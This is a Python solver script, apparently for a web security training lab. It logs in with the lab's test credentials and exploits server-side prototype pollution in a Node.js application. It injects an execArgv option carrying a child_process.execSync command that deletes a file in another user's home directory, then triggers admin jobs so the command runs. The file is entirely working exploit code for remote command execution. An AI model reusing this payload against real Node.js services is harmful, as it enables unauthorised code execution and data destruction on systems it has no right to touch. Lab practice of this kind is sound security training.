import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', json=data)

    def escalate_my_account_to_admin(self):
        session_id = self.session.cookies.get('session')
        data = {
            'sessionId': session_id,
            '__proto__': {
                'execArgv': [
                    '--eval=require(\'child_process\').execSync(\'rm /home/carlos/morale.txt\')'
                ]
            }
        }
        self.session.post(self.lab_url + 'my-account/change-address', json=data)

    def trigger_job(self):
        session_id = self.session.cookies.get('session')
        data = {
            'csrf': self.get_csrf_token('admin'),
            'sessionId': session_id,
            'tasks': ['db-cleanup', 'fs-cleanup']
        }
        self.session.post(self.lab_url + 'admin/jobs', json=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_as_wiener()
        self.escalate_my_account_to_admin()
        self.trigger_job()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
